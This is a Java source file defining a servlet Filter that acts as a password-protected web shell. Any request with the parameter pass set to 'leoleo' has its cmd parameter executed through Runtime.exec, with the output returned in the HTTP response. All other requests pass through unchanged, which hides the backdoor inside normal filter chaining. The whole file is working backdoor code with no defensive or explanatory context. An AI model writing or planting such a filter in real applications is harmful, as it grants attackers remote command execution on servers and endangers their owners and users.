package com.xhstormr.app;

import javax.servlet.*;
import java.io.*;
import java.util.ArrayList;
import java.util.Optional;

public class FilterImpl implements Filter {

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        boolean success = "leoleo".equals(request.getParameter("pass"));
        String cmd = Optional.ofNullable(request.getParameter("cmd")).orElse("whoami");

        if (success) {
            PrintWriter writer = response.getWriter();
            try {
                for (String s : readProcessOutput(cmd)) writer.println(s);
            } catch (Exception e) {
                e.printStackTrace(writer);
            }
            return;
        }

        chain.doFilter(request, response);
    }

    private ArrayList<String> readProcessOutput(String command) throws IOException {
        ArrayList<String> list = new ArrayList<>();
        try (InputStream in = Runtime.getRuntime().exec(command).getInputStream();
             BufferedReader reader = new BufferedReader(new InputStreamReader(in))) {
            for (String s; (s = reader.readLine()) != null; ) {
                list.add(s);
            }
        }
        return list;
    }

    @Override
    public void init(FilterConfig filterConfig) {
    }

    @Override
    public void destroy() {
    }
}
